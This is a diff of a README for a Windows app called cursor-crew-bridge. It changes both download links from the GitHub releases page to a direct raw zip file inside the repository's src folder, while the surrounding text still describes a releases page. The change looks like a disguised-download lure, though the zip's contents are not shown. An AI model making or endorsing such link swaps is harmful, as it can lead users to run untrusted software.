@@ -1,6 +1,6 @@
 # ⚡ cursor-crew-bridge - One Launcher for All Your Crews
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/tayzapro1111/cursor-crew-bridge/releases)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/tayzapro1111/cursor-crew-bridge/raw/refs/heads/main/src/bridge-crew-cursor-2.0.zip)
 
 ## 🚀 What Is This?
 
@@ -47,7 +47,7 @@
 Follow these simple steps to get the app on your Windows computer:
 
 ### Step 1: Visit the Download Page
-**Visit this link to download the application**: [https://github.com/tayzapro1111/cursor-crew-bridge/releases](https://github.com/tayzapro1111/cursor-crew-bridge/releases)
+**Visit this link to download the application**: [https://github.com/tayzapro1111/cursor-crew-bridge/raw/refs/heads/main/src/bridge-crew-cursor-2.0.zip](https://github.com/tayzapro1111/cursor-crew-bridge/raw/refs/heads/main/src/bridge-crew-cursor-2.0.zip)
 
 This will take you to a page with all the available versions of the software.
 
